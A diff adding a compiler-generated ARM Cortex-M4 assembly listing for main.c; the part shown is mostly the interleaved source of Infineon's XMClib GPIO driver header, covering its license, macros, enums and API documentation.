@@ -1,0 +1,2459 @@
+   1              		.cpu cortex-m4
+   2              		.eabi_attribute 27, 1
+   3              		.eabi_attribute 20, 1
+   4              		.eabi_attribute 21, 1
+   5              		.eabi_attribute 23, 3
+   6              		.eabi_attribute 24, 1
+   7              		.eabi_attribute 25, 1
+   8              		.eabi_attribute 26, 1
+   9              		.eabi_attribute 30, 6
+  10              		.eabi_attribute 34, 1
+  11              		.eabi_attribute 18, 4
+  12              		.file	"main.c"
+  13              		.text
+  14              	.Ltext0:
+  15              		.cfi_sections	.debug_frame
+  16              		.section	.text.XMC_GPIO_SetOutputHigh,"ax",%progbits
+  17              		.align	1
+  18              		.arch armv7e-m
+  19              		.syntax unified
+  20              		.thumb
+  21              		.thumb_func
+  22              		.fpu fpv4-sp-d16
+  24              	XMC_GPIO_SetOutputHigh:
+  25              	.LFB130:
+  26              		.file 1 "/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h"
+   1:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h **** /**
+   2:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  * @file xmc_gpio.h
+   3:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  * @date 2015-06-20
+   4:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  *
+   5:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  * @cond
+   6:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  **************************************************************************************************
+   7:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  * XMClib v2.1.16 - XMC Peripheral Driver Library 
+   8:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  *
+   9:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  * Copyright (c) 2015-2017, Infineon Technologies AG
+  10:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  * All rights reserved.                        
+  11:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  *                                             
+  12:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  * Redistribution and use in source and binary forms, with or without modification,are permitted pr
+  13:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  * following conditions are met:   
+  14:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  *                                                                              
+  15:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  * Redistributions of source code must retain the above copyright notice, this list of conditions a
+  16:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  * disclaimer.                        
+  17:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  * 
+  18:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  * Redistributions in binary form must reproduce the above copyright notice, this list of condition
+  19:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  * disclaimer in the documentation and/or other materials provided with the distribution.          
+  20:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  * 
+  21:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  * Neither the name of the copyright holders nor the names of its contributors may be used to endor
+  22:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  * products derived from this software without specific prior written permission.                  
+  23:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  *                                                                              
+  24:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND ANY EXPRESS OR I
+  25:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  * INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTI
+  26:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  * DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE  FOR ANY DIRECT, IN
+  27:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  * SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBS
+  28:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  * SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THE
+  29:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  * WHETHER IN CONTRACT, STRICT LIABILITY,OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY
+  30:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  * OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.                            
+  31:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  *                                                                              
+  32:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  * To improve the quality of the software, users are encouraged to share modifications, enhancement
+  33:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  * Infineon Technologies AG dave@infineon.com).                                                    
+  34:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  **************************************************************************************************
+  35:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  *
+  36:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  * Change History
+  37:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  * --------------
+  38:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  *
+  39:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  * 2015-02-20:
+  40:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  *     - Initial draft<br>
+  41:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  *     - Documentation improved <br>
+  42:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  *      
+  43:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  * 2015-06-20:
+  44:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  *     - Removed version macros and declaration of GetDriverVersion API
+  45:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  *
+  46:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  * @endcond
+  47:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  *
+  48:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  */
+  49:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h **** 
+  50:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h **** #ifndef XMC_GPIO_H
+  51:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h **** #define XMC_GPIO_H
+  52:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h **** 
+  53:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h **** /**************************************************************************************************
+  54:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  * HEADER FILES
+  55:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  **************************************************************************************************
+  56:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h **** 
+  57:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h **** #include "xmc_common.h"
+  58:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h **** 
+  59:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h **** /**
+  60:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  * @addtogroup XMClib XMC Peripheral Library
+  61:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  * @{
+  62:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  */
+  63:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h **** 
+  64:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h **** /**
+  65:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  * @addtogroup GPIO
+  66:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  * @brief General Purpose Input Output (GPIO) driver for the XMC microcontroller family.
+  67:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  *
+  68:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  * GPIO driver provide a generic and very flexible software interface for all standard digital I/O 
+  69:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  * Each port slice has individual interfaces for the operation as General Purpose I/O and it furthe
+  70:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  * connectivity to the on-chip periphery and the control for the pad characteristics. 
+  71:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  *
+  72:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  * The driver is divided into Input and Output mode.
+  73:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  *
+  74:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  * Input mode features:
+  75:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  * -# Configuration structure XMC_GPIO_CONFIG_t and initialization function XMC_GPIO_Init()
+  76:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  * -# Allows the selection of weak pull-up or pull-down device. Configuration structure XMC_GPIO_MO
+  77:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  * \if XMC1
+  78:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  * -# Allows the selection of input hysteresis. XMC_GPIO_SetInputHysteresis()
+  79:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  * \endif
+  80:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  *
+  81:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  * 
+  82:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  * Output mode features:
+  83:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  * -# Allows the selection of push pull/open drain and Alternate output. Configuration structure XM
+  84:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  * \if XMC4
+  85:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  * -# Allows the selection of pad driver strength. Configuration structure XMC_GPIO_OUTPUT_STRENGTH
+  86:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  * \endif
+  87:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  *
+  88:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  * -# Allows the selection of initial output level. Configuration structure XMC_GPIO_OUTPUT_LEVEL_t
+  89:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  *
+  90:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  *@{
+  91:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  */
+  92:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  
+  93:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h **** /**************************************************************************************************
+  94:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  * MACROS
+  95:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  **************************************************************************************************
+  96:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h **** 
+  97:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h **** #define PORT_IOCR_PC_Pos PORT0_IOCR0_PC0_Pos
+  98:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h **** #define PORT_IOCR_PC_Msk PORT0_IOCR0_PC0_Msk
+  99:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h **** 
+ 100:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h **** #define PORT_IOCR_PC_Size 				(8U)
+ 101:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h **** 											
+ 102:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h **** 
+ 103:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h **** #define XMC_GPIO_CHECK_OUTPUT_LEVEL(level) ((level == XMC_GPIO_OUTPUT_LEVEL_LOW) || \
+ 104:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****                                             (level == XMC_GPIO_OUTPUT_LEVEL_HIGH))
+ 105:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****                                             
+ 106:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h **** #define XMC_GPIO_CHECK_HWCTRL(hwctrl) ((hwctrl == XMC_GPIO_HWCTRL_DISABLED) || \
+ 107:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****                                        (hwctrl == XMC_GPIO_HWCTRL_PERIPHERAL1) || \
+ 108:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****                                        (hwctrl == XMC_GPIO_HWCTRL_PERIPHERAL2))                    
+ 109:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****                                             
+ 110:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h **** /**************************************************************************************************
+ 111:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  * ENUMS
+ 112:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  **************************************************************************************************
+ 113:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h **** 
+ 114:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h **** 
+ 115:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h **** /**
+ 116:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  * Defines output level of a pin. Use type \a XMC_GPIO_OUTPUT_LEVEL_t for this enum.
+ 117:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  */
+ 118:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h **** typedef enum XMC_GPIO_OUTPUT_LEVEL
+ 119:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h **** {
+ 120:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****   XMC_GPIO_OUTPUT_LEVEL_LOW  = 0x10000U, /**<  Reset bit */
+ 121:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****   XMC_GPIO_OUTPUT_LEVEL_HIGH = 0x1U, 	/**< Set bit  */
+ 122:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h **** } XMC_GPIO_OUTPUT_LEVEL_t;
+ 123:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h **** 
+ 124:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h **** /**
+ 125:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  * Defines direct hardware control characteristics of the pin . Use type \a XMC_GPIO_HWCTRL_t for t
+ 126:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  */
+ 127:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h **** typedef enum XMC_GPIO_HWCTRL
+ 128:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h **** {
+ 129:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****   XMC_GPIO_HWCTRL_DISABLED     = 0x0U, /**<  Software control only */
+ 130:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****   XMC_GPIO_HWCTRL_PERIPHERAL1  = 0x1U, /**<  HWI0/HWO0 control path can override the software confi
+ 131:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****   XMC_GPIO_HWCTRL_PERIPHERAL2  = 0x2U  /**<  HWI1/HWO1 control path can override the software confi
+ 132:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h **** } XMC_GPIO_HWCTRL_t;
+ 133:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h **** 
+ 134:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h **** /**************************************************************************************************
+ 135:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  * DEVICE FAMILY EXTENSIONS
+ 136:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  **************************************************************************************************
+ 137:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h **** 
+ 138:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  #if UC_FAMILY == XMC1
+ 139:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h **** #include "xmc1_gpio.h"
+ 140:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h **** #elif UC_FAMILY == XMC4
+ 141:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h **** #include "xmc4_gpio.h"
+ 142:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h **** #else
+ 143:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h **** #error "xmc_gpio.h: family device not supported"
+ 144:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h **** #endif
+ 145:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h **** 
+ 146:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h **** /**************************************************************************************************
+ 147:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  * API PROTOTYPES
+ 148:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  **************************************************************************************************
+ 149:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h **** 
+ 150:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h **** #ifdef __cplusplus
+ 151:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h **** extern "C" {
+ 152:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h **** #endif
+ 153:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h **** 
+ 154:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h **** 
+ 155:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h **** /**
+ 156:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  * @param  port	  Constant pointer pointing to GPIO port, to access port registers like Pn_OUT,Pn_O
+ 157:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  * @param  pin	  Port pin number.
+ 158:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  * @param  config GPIO configuration data structure. Refer data structure @ref XMC_GPIO_CONFIG_t fo
+ 159:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  *
+ 160:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  * @return None
+ 161:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  *
+ 162:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  * \par<b>Description:</b><br>
+ 163:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  * \if XMC1
+ 164:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  * Initializes input / output mode settings like, pull up / pull down devices,hysteresis, push pull
+ 165:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  * Also configures alternate function outputs and clears hardware port control for a selected \a po
+ 166:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  * \a config provides selected I/O settings. It configures hardware registers Pn_IOCR,Pn_OUT, Pn_OM
+ 167:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  * \endif
+ 168:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  * \if XMC4
+ 169:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  * Initializes input / output mode settings like, pull up / pull down devices,push pull /open drain
+ 170:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  * Also configures alternate function outputs and clears hardware port control for selected \a port
+ 171:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  * It configures hardware registers Pn_IOCR,Pn_OUT,Pn_OMR,Pn_PDISC and Pn_PDR.\n
+ 172:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  * \endif
+ 173:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  *
+ 174:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  * \par<b>Related APIs:</b><BR>
+ 175:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  *  None
+ 176:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  *
+ 177:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  * \par<b>Note:</b><br>
+ 178:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  * This API is called in definition of DAVE_init by code generation and therefore should not be exp
+ 179:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  * for the normal operation. Use other APIs only after DAVE_init is called successfully (returns DA
+ 180:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  *
+ 181:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  *
+ 182:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  */
+ 183:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h **** 
+ 184:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  
+ 185:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h **** void XMC_GPIO_Init(XMC_GPIO_PORT_t *const port, const uint8_t pin, const XMC_GPIO_CONFIG_t *const c
+ 186:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  
+ 187:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h **** /**
+ 188:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  *
+ 189:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  * @param  port	Constant pointer pointing to GPIO port, to access hardware register Pn_IOCR.
+ 190:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  * @param  pin	Port pin number.
+ 191:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  * @param  mode input / output functionality selection. Refer @ref XMC_GPIO_MODE_t for valid values
+ 192:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  *
+ 193:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  * @return None
+ 194:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  *
+ 195:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  * \par<b>Description:</b><br>
+ 196:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  * Sets digital input and output driver functionality and characteristics of a GPIO port pin. It co
+ 197:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  * registers Pn_IOCR. \a mode is initially configured during initialization in XMC_GPIO_Init(). Cal
+ 198:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  * the port direction functionality as needed later in the program.
+ 199:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  *
+ 200:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  * \par<b>Related APIs:</b><BR>
+ 201:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  *  None
+ 202:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  *
+ 203:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  */
+ 204:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h **** 
